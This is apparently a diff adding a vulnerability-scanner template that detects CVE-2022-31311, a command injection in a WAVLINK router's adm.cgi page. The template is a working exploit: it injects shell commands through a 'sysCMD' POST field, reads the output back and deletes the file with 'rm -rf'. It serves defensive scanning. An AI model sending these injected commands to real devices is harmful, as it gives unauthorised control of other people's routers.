@@ -1,0 +1,63 @@
+id: CVE-2022-31311
+
+info:
+  name: WAVLINK adm.cgi Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An issue in adm.cgi of WAVLINK AERIAL X 1200M M79X3.V5030.180719 allows attackers to execute arbitrary commands via a crafted POST request.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-31311
+  classification:
+    cve-id: CVE-2022-31311
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: iot,code-execution
+
+variables:
+  cmd: "id"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: "step1"
+    raw:
+      - |
+        POST /cgi-bin/adm.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=sysCMD&command=";ls>./1.txt;"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: "step2"
+    raw:
+      - |
+        GET /cgi-bin/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".cgi"
+
+  - id: "step3"
+    raw:
+      - |
+        POST /cgi-bin/adm.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=sysCMD&command=";rm -rf ./1.txt;"
+    matchers:
+      - type: status
+        status:
+          - 200
